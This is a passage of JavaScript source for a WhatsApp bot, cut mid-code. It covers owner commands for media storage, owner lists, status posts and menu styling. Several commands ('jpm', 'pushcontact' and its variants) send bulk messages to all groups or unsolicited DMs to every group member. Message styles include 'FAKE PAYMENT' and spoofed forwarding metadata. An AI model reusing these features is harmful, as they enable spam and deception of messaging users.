                  db.groups[m.chat].antibot = false
                  replygcxeon(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
			case 'pinchat': {
if (!XeonTheCreator) return XeonStickOwner()
if (m.isGroup) return XeonStickPrivate()
XeonBotInc.chatModify({ pin: true }, m.chat)
}
break
case 'unpinchat': {
if (!XeonTheCreator) return XeonStickOwner()
if (m.isGroup) return XeonStickPrivate()
XeonBotInc.chatModify({ pin: false }, m.chat)
}
break
			case 'clearchat': {
if (!XeonTheCreator) return XeonStickOwner()
XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
			case 'checkmember': case 'cekmember':{
                                if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                                if (!m.isGroup) return XeonStickGroup()
replygcxeon(`Group: *${groupMetadata.subject}*\nTotal participants: *${participants.length}*`)
                                }
                                break
			case 'jpm': case 'post': case 'pushcontactgc': {
if (!XeonTheCreator) return XeonStickOwner()
if (!m.isGroup) return XeonStickGroup()
if (!text) return replygcxeon(`*Incorrect Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Images to All Groups\nFor a pause, 1000 = 1 second\n\nExample: ${prefix + command} hello|9000`)
await replygcxeon(`In progress...`)
let getGroups = await XeonBotInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await XeonBotInc.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await XeonBotInc.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await XeonBotInc.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
replygcxeon(`Success`)
}
break
			case 'pushcontact': {
    if (!XeonTheCreator) return XeonStickOwner()
    if (!m.isGroup) return XeonStickGroup()
    if (!text) return replygcxeon(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcxeon(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    XeonBotInc.sendMessage(pler, { text: q})
     }  
     replygcxeon(`Done`)
      }
      break
case 'pushcontactv2':{
if (!XeonTheCreator) return XeonStickOwner()
if (!q) return replygcxeon(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
try {
const metadata2 = await XeonBotInc.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
XeonBotInc.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replygcxeon(`Success`)
} catch {
	replygcxeon(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
	}
}
break
case 'pushcontactv3': {
if (!XeonTheCreator) return XeonStickOwner()
if (!m.isGroup) return XeonStickGroup()
if (!text) return replygcxeon(
`
*Usage example :*

${prefix+command} pause|text

‼️Reply Image To Send Images to All Participants, For a pause, 1000 = 1 second
`
)
try {
let jedany = text.split("|")[0]
let captny = text.split("|")[1]
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (/image/.test(mime)) {
media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await XeonBotInc.sendMessage(men, { image: { url: mem }, caption: captny }, { quoted: m })
await sleep(jedany)
} else {
await XeonBotInc.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
}
}
replygcxeon(`Success`)
} catch {
	replygcxeon(
`
*Usage example :*

${prefix+command} pause|text

‼️Reply Image To Send Images to All Participants, For a pause, 1000 = 1 second
`
)
}
}
break
			case 'autosticker': case 'autostickergc':
if (!XeonTheCreator) return XeonStickOwner()        
                if (q == 'on') {
                    db.settings[botNumber].autosticker = true
                    replygcxeon(`Successfully Changed Auto Sticker To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].autosticker = false
                    replygcxeon(`Successfully Changed Auto Sticker To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'addvideo':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Whats the video name?')
if (VideoXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
VideoXeon.push(q)
await fsx.copy(delb, `./XeonMedia/video/${q}.mp4`)
fs.writeFileSync('./XeonMedia/database/xeonvideo.json', JSON.stringify(VideoXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Enter the video name')
if (!VideoXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = VideoXeon.indexOf(q)
VideoXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonvideo.json', JSON.stringify(VideoXeon))
fs.unlinkSync(`./XeonMedia/video/${q}.mp4`)
replygcxeon(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoXeon) {
teks += `│${setv} ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoXeon.length}*`
replygcxeon(teks)
}
break
case 'addimage':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Whats the image name?')
if (ImageXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
ImageXeon.push(q)
await fsx.copy(delb, `./XeonMedia/image/${q}.jpg`)
fs.writeFileSync('./XeonMedia/database/xeonimage.json', JSON.stringify(ImageXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Enter the image name')
if (!ImageXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = ImageXeon.indexOf(q)
ImageXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonimage.json', JSON.stringify(ImageXeon))
fs.unlinkSync(`./XeonMedia/image/${q}.jpg`)
replygcxeon(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageXeon) {
teks += `│${setv} ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageXeon.length}*`
replygcxeon(teks)
}
break
case 'addsticker':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Whats the sticker name?')
if (StickerXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
StickerXeon.push(q)
await fsx.copy(delb, `./XeonMedia/sticker/${q}.webp`)
fs.writeFileSync('./XeonMedia/database/xeonsticker.json', JSON.stringify(StickerXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Enter the sticker name')
if (!StickerXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = StickerXeon.indexOf(q)
StickerXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonsticker.json', JSON.stringify(StickerXeon))
fs.unlinkSync(`./XeonMedia/sticker/${q}.webp`)
replygcxeon(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of StickerXeon) {
teks += `│${setv} ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerXeon.length}*`
replygcxeon(teks)
}
break
case 'addvn':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Whats the audio name?')
if (VoiceNoteXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
VoiceNoteXeon.push(q)
await fsx.copy(delb, `./XeonMedia/audio/${q}.mp3`)
fs.writeFileSync('./XeonMedia/database/xeonvn.json', JSON.stringify(VoiceNoteXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Enter the vn name')
if (!VoiceNoteXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = VoiceNoteXeon.indexOf(q)
VoiceNoteXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonvn.json', JSON.stringify(VoiceNoteXeon))
fs.unlinkSync(`./XeonMedia/audio/${q}.mp3`)
replygcxeon(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteXeon) {
teks += `│${setv} ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteXeon.length}*`
replygcxeon(teks)
}
break
case 'addzip':{
if (!XeonTheCreator) return XeonStickOwner()

if (args.length < 1) return replygcxeon(`What's the zip name?`)
let teks = `${text}`
{
if (ZipXeon.includes(teks)) return replygcxeon("This name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./XeonMedia/zip/${teks}.zip`)
fs.writeFileSync('./XeonMedia/database/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!XeonTheCreator) return XeonStickOwner()

if (args.length < 1) return replygcxeon('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
let wanu = ZipXeon.indexOf(teks)
ZipXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./XeonMedia/zip/${teks}.zip`)
replygcxeon(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {

let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipXeon) {
teksooooo += `│${setv} ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
replygcxeon(teksooooo)
}
break
case 'addapk':{
if (!XeonTheCreator) return XeonStickOwner()

if (args.length < 1) return replygcxeon('What is the name of the apk?')
let teks = `${text}`
{
if (ApkXeon.includes(teks)) return replygcxeon("This name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./XeonMedia/apk/${teks}.apk`)
fs.writeFileSync('./XeonMedia/database/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(delb)
replygcxeon(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!XeonTheCreator) return XeonStickOwner()

if (args.length < 1) return replygcxeon('Name of the apk?')
let teks = `${text}`
{
if (!ApkXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
let wanu = ApkXeon.indexOf(teks)
ApkXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./XeonMedia/apk/${teks}.apk`)
replygcxeon(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {

let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkXeon) {
teksoooooo += `│${setv} ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
replygcxeon(teksoooooo)
}
break
case 'addpdf':{
if (!XeonTheCreator) return XeonStickOwner()

if (args.length < 1) return replygcxeon('What is the name of the pdf')
let teks = `${text}`
{
if (DocXeon.includes(teks)) return replygcxeon("This name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
DocXeon.push(teks)
await fsx.copy(delb, `./XeonMedia/doc/${teks}.pdf`)
fs.writeFileSync('./XeonMedia/database/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(delb)
replygcxeon(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!XeonTheCreator) return XeonStickOwner()

if (args.length < 1) return replygcxeon('Enter the name')
let teks = `${text}`
{
if (!DocXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
let wanu = DocXeon.indexOf(teks)
DocXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./XeonMedia/doc/${teks}.pdf`)
replygcxeon(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {

let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of DocXeon) {
teksoooo += `│${setv} ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${DocXeon.length}*`
replygcxeon(teksoooo)
}
break
			case 'addmsg': {
				if (!XeonTheCreator) return XeonStickOwner()
				if (!m.quoted) return replygcxeon('Reply to messages you want to save in the database')
				if (!text) return replygcxeon(`Example : ${prefix + command} file name`)
				let msgs = global.db.database
				if (text.toLowerCase() in msgs) return replygcxeon(`'${text}' has been registered in the message list`)
				msgs[text.toLowerCase()] = m.quoted
				delete msgs[text.toLowerCase()].chat
				replygcxeon(`Successfully added the message to the message list as '${text}'\nAccess with ${prefix}getmsg ${text}\nView the Message With ${prefix}listmsg`)
			}
			break
			case 'delmsg': case 'deletemsg': {
				if (!XeonTheCreator) return XeonStickOwner()
				if (!text) return replygcxeon('The name of the message you want to delete?')
				let msgs = global.db.database
				if (text == 'allmsg') {
					global.db.database = {}
					replygcxeon('Successfully deleted all msgs from the message list')
				} else {
					if (!(text.toLowerCase() in msgs)) return replygcxeon(`'${text}' not listed in the message list`)
					delete msgs[text.toLowerCase()]
					replygcxeon(`Successfully deleted '${text}' from the message list`)
				}
			}
			break
			case 'getmsg': {
				if (!text) return replygcxeon(`Example : ${prefix + command} file name\n\nView the list of messages with ${prefix}listmsg`)
				let msgs = global.db.database
				if (!(text.toLowerCase() in msgs)) return replygcxeon(`'${text}' not listed in the message list`)
				await XeonBotInc.relayMessage(m.chat, msgs[text.toLowerCase()], {})
			}
			break
			case 'listmsg': {
				let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
				let teks = '「 LIST DATABASE 」\n\n'
				for (let i of seplit) {
					teks += `${setv} *Name :* ${i.nama}\n${setv} *Type :* ${getContentType(i.message)?.replace(/Message/i, '')}\n────────────────────────\n\n`
				}
				replygcxeon(teks)
			}
			break
			case 'addowner':
if (!XeonTheCreator) return XeonStickOwner()
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await XeonBotInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcxeon(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./src/owner.json', JSON.stringify(owner))
replygcxeon(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!XeonTheCreator) return XeonStickOwner()
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./src/owner.json', JSON.stringify(owner))
replygcxeon(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listowner': {
                let teks = '┌──⭓「 *List Owner* 」\n│\n'
                for (let x of owner) {
                    teks += `│${setv} ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
                replygcxeon(teks)
            }
            break
			case 'shutdown':{
                if (!XeonTheCreator) return XeonStickOwner()
                replygcxeon(`Restarting will be completed in seconds`)
                await sleep(3000)
                process.exit()
                }
            break
			  case 'userjid':
  case 'jid':
  case 'groupjid':
            case 'id':{
            replygcxeon(m.chat)
           }
          break
			case 'getexif': case 'getwm': case 'getwatermark':{
                if (!XeonTheCreator) return XeonStickOwner()
               replygcxeon(`*Water Mark/Exif of ${botname} is*\n\n${setv} Packname : ${packname}\n${setv} Author : ${author}`)
               }
                break
                case 'getautoblocknumber': case 'getautoblockno': case 'getautoblock':{
                if (!XeonTheCreator) return XeonStickOwner()
               replygcxeon(`*Auto Block Country Code of ${botname} is*\n\n${setv} Country Code : ${autoblocknumber}\n\n_Note: Once autoblock number is activated, numbers related to this country code will be blocked automatcially_`)
               }
                break
                case 'getantiforeign': case 'getantiforeignno': case 'getantiforeignnumber':{
                if (!XeonTheCreator) return XeonStickOwner()
               replygcxeon(`*Anti Foreign Country Code of ${botname} is*\n\n${setv} Country Code : ${antiforeignnumber}\n\n_Note: Once antiforeign number is activated in any group chat, only members related to this country code are allowed to stay in the group chat, others will be kicked immediately, if chatted._`)
               }
                break
			case 'setexif':
            case 'setwm':{
                if (!XeonTheCreator) return XeonStickOwner()
                if (!text) return replygcxeon(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replygcxeon(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                }
                break
			    case 'creategc': case 'creategroup': {
if (!XeonTheCreator) return XeonStickOwner()
if (!args.join(" ")) return replygcxeon(`Use ${prefix+command} groupname`)
try {
let cret = await XeonBotInc.groupCreate(args.join(" "), [])
let response = await XeonBotInc.groupInviteCode(cret.id)
const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
XeonBotInc.sendMessage(m.chat, { text:teksop, mentions: await XeonBotInc.parseMention(teksop)}, {quoted:m})
} catch {
	replygcxeon(`Error`)
	}
}
break
			case 'resetuser':
            case 'resetdbuser': {
               if (!XeonTheCreator) return XeonStickOwner()
               let totalusernya = db.users[0]
               replygcxeon(`Succesfully Deleted ${totalusernya} Users in Database`)
               db.users = []
            }
            break
			case 'resethit':
            case 'resettotalhit': {
               if (!XeonTheCreator) return XeonStickOwner()
               global.db.settings[botNumber].totalhit = 0
               replygcxeon(mess.done)
            }
            break
			case 'setreply':{
               if (!XeonTheCreator) return XeonStickOwner()
               if (text.startsWith('v')) {
                  typereply = text
                  replygcxeon(mess.done)
               } else {
                  let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT REPLY 🐛",
"sections":[{"title":"SELECT THE REPLY BELOW",
"highlight_label":"OWNER'S FAVOURITE",
"rows":[{"header":"CHANNEL + LINK THUMB",
"title":"CHOOSE ",
"description":"CHANNEL + LINK THUMB",
"id":"${prefix+command} v4"},
{"header":"LARGE LINK + THUMBNAIL",
"title":"CHOOSE ",
"description":"LARGE LINK + THUMBNAIL",
"id":"${prefix+command} v3"},
{"header":"LINK + FAKE THUMBNAIL",
"title":"CHOOSE ",
"description":"LINK + FAKE THUMBNAIL",
"id":"${prefix+command} v2"},
{"header":"QUOTED NORMALLY",
"title":"CHOOSE ",
"description":"QUOTED NORMALLY",
"id":"${prefix+command} v1"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'statustext': 
            case 'upswtext':
            case 'upswteks': {
               if (!XeonTheCreator) return XeonStickOwner()
               if (!q) return replygcxeon('Text?')
               await XeonBotInc.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.users) })
               replygcxeon(mess.done)
            }
            break
            case 'statusvideo':
            case 'upswvideo': {
               if (!XeonTheCreator) return XeonStickOwner()
               if (/video/.test(mime)) {
                  var videosw = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                  await XeonBotInc.sendMessage('status@broadcast', {
                     video: {
                        url: videosw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.users) })
                  await replygcxeon(mess.done)
               } else {
                  replygcxeon('Reply to video')
               }
            }
            break
            case 'statusimg':
            case 'statusimage':
            case 'upswimg': {
               if (!XeonTheCreator) return XeonStickOwner()
               if (/image/.test(mime)) {
                  var imagesw = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                  await XeonBotInc.sendMessage('status@broadcast', {
                     image: {
                        url: imagesw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.users)})
                  await replygcxeon(mess.done)
               } else {
                  replygcxeon('Reply to image')
               }
            }
            break
            case 'statusaudio':
            case 'upswaudio': {
               if (!XeonTheCreator) return XeonStickOwner()
               if (/audio/.test(mime)) {
                  var audiosw = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                  await XeonBotInc.sendMessage('status@broadcast', {
                     audio: {
                        url: audiosw
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#FF000000',
                     statusJidList: Object.keys(global.db.users)
                  })
                  await replygcxeon(mess.done)
               } else {
                  replygcxeon('Reply to audio')
               }
            }
            break
			case 'setvidmenu':
            case 'svm': 
            	case 'setvgifmenu':
            case 'sgm': {
                if (!XeonTheCreator) return XeonStickOwner()
                try {
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './XeonMedia/theme/Cheems-bot.mp4')
                fs.unlinkSync(delb)
                replygcxeon(mess.done)
                } catch {
                	replygcxeon(`Please reply to a image with caption ${prefix+command}`)
                }
            }
            break
			case 'setimgmenu':
            case 'sim': {
                if (!XeonTheCreator) return XeonStickOwner()
                try {
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './XeonMedia/theme/cheemspic.jpg')
                fs.unlinkSync(delb)
                replygcxeon(mess.done)
                } catch {
                	replygcxeon(`Please reply to a image with caption ${prefix+command}`)
                }
            }
            break
			case 'setmenu': {
            if (!XeonTheCreator) return XeonStickOwner()
            if (text.startsWith('v')) {
                  typemenu = text
                  replygcxeon(mess.done)
               } else {
               let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT MENU 🗂️",
"sections":[{"title":"SELECT THE MENU BELOW",
"highlight_label":"OWNER'S FAVOURITE",
"rows":[{"header":"BUTTON + CHANNEL V2",
"title":"CHOOSE ",
"description":"BUTTON + CHANNEL V2",
"id":"${prefix+command} v12"},
{"header":"BUTTON + CHANNEL",
"title":"CHOOSE ",
"description":"BUTTON + CHANNEL",
"id":"${prefix+command} v11"},
{"header":"ONLY BUTTON",
"title":"CHOOSE ",
"description":"ONLY BUTTON",
"id":"${prefix+command} v10"},
{"header":"CHANNEL + FAKE THUMBNAIL V2",
"title":"CHOOSE ",
"description":"CHANNEL + FAKE THUMBNAIL V2",
"id":"${prefix+command} v9"},
{"header":"CHANNEL + FAKE THUMBNAIL",
"title":"CHOOSE ",
"description":"CHANNEL + FAKE THUMBNAIL",
"id":"${prefix+command} v8"},
{"header":"FAKE THUMBNAIL + DOCUMENT",
"title":"CHOOSE ",
"description":"FAKE THUMBNAIL + DOCUMENT",
"id":"${prefix+command} v7"},
{"header":"FAKE PAYMENT",
"title":"CHOOSE ",
"description":"FAKE PAYMENT",
"id":"${prefix+command} v6"},
{"header":"CALL SCHEDULE",
"title":"CHOOSE",
"description":"CALL SCHEDULE",
"id":"${prefix+command} v5"},
{"header":"GIF THUMBNAIL",
"title":"CHOOSE",
"description":"GIF THUMBNAIL",
"id":"${prefix+command} v4"},
{"header":"VIDEO THUMBNAIL",
"title":"CHOOSE",
"description":"VIDEO THUMBNAIL",
"id":"${prefix+command} v3"},
{"header":"CHANNEL + THUMBNAIL",
"title":"CHOOSE",
"description":"CHANNEL + THUMBNAIL",
"id":"${prefix+command} v2"},
{"header":"IMAGE THUMBNAIL",
"title":"CHOOSE",
"description":"IMAGE THUMBNAIL",
"id":"${prefix+command} v1"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
